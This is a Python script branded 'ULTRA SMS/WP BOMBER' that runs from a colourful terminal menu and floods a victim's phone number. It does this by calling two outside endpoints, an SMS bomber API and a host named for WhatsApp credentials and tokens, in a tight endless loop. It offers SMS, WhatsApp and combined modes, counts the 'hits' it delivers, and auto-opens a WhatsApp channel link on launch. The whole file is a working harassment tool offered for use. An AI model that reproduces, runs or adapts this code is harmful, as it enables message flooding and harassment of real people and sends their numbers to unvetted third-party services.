import os
import asyncio
import aiohttp
import time
import sys

# --- API Config ---
API_SMS = "https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php"
API_WP = "https://get-wp-creds-json-and-access-token.onrender.com/code"

# --- Colors ---
R = "\033[1;31m" # Red
G = "\033[1;32m" # Green
Y = "\033[1;33m" # Yellow
B = "\033[1;34m" # Blue
P = "\033[1;35m" # Purple
C = "\033[1;36m" # Cyan
W = "\033[1;37m" # White

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def line():
    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")

async def call_api(session, mode, target):
    try:
        if mode == "sms":
            async with session.get(API_SMS, params={"number": target}, timeout=5) as r:
                return r.status == 200
        elif mode == "wp":
            async with session.get(API_WP, params={"number": target}, timeout=5) as r:
                return r.status == 200
        return False
    except:
        return False

async def run_bomber(mode):
    clear()
    print(f"\n{R}  [!] WARNING: UNLIMITED MODE ACTIVE")
    line()
    target = input(f"{Y}  [+] TARGET NUMBER (92xxx): {W}").strip()
    line()
    print(f"{P}  [*] BLASTING STARTED... PRESS CTRL+C TO STOP")
    line()

    success = 0
    async with aiohttp.ClientSession() as session:
        try:
            while True:
                if mode == "multi":
                    tasks = [call_api(session, "sms", target), call_api(session, "wp", target)]
                    await asyncio.gather(*tasks)
                    success += 2
                else:
                    await call_api(session, mode, target)
                    success += 1

                # Dynamic Counter
                sys.stdout.write(f"\r{G}  [✔] TOTAL HITS SENT : {W}{success} {R}●{W}")
                sys.stdout.flush()
                await asyncio.sleep(0.01)
        except KeyboardInterrupt:
            print(f"\n\n{G}  [✔] ATTACK FINISHED SUCCESSFULLY!")
            print(f"{Y}  [✔] TOTAL HITS DELIVERED: {W}{success}")
            line()
            input(f"{C}  [ Press Enter to Return to Menu ]{W}")

async def main():
    # Auto-open channel
    os.system("termux-open-url https://whatsapp.com/channel/0029VbAfR3Z4CrfrBQe5EX43")

    while True:
        clear()
        # High-End ASCII Art
        print(f"""{R}
  _____  _____ _____ _____ _______       _      
 |  __ \|_   _/ ____|_   _|__   __|/\   | |     
 | |  | | | || |  __  | |    | |  /  \  | |     
 | |  | | | || | |_ | | |    | | / /\ \ | |     
 | |__| |_| || |__| |_| |_   | |/ ____ \| |____ 
 |_____/|_____\_____|_____|  |_/_/    \_\______|
                                                
  _____   ____  _   _ 
 |  __ \ / __ \| \ | |
 | |  | | |  | |  \| |
 | |  | | |  | | . ` |
 | |__| | |__| | |\  |
 |_____/ \____/|_| \_|
{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{W}  [+] {G}OWNER     {W}: {Y}NIZAMANI {R}(DIGITAL DON)
{W}  [+] {G}TOOL      {W}: {C}ULTRA SMS/WP BOMBER
{W}  [+] {G}STATUS    {W}: {R}ONLINE {G}●
{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}""")

        print(f"\n  {G}[01]{W} SMS BLASTING  {P}(FAST)")
        print(f"  {G}[02]{W} WHATSAPP BLAST {P}(STRIKE)")
        print(f"  {G}[03]{W} MULTI-STRIKE  {R}(ULTRA MIX) 🔥")
        print(f"  {R}[00]{W} EXIT TERMINAL")
        
        line()
        choice = input(f"{Y}  [+] SELECT OPTION >> {W}").strip()

        if choice in ["1", "01"]: await run_bomber("sms")
        elif choice in ["2", "02"]: await run_bomber("wp")
        elif choice in ["3", "03"]: await run_bomber("multi")
        elif choice in ["0", "00"]: 
            print(f"\n{R}  [!] TERMINATING CONNECTION...{W}")
            time.sleep(1)
            break

if __name__ == "__main__":
    asyncio.run(main())
